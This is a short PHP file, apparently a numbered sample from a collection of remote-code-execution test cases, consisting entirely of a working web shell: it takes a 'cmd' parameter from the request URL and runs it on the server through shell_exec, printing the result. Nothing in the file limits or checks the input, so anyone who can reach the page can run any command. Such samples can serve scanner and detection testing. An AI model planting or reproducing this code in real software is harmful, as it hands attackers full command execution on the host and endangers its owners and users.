<?php
// RCE test variation #1382
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>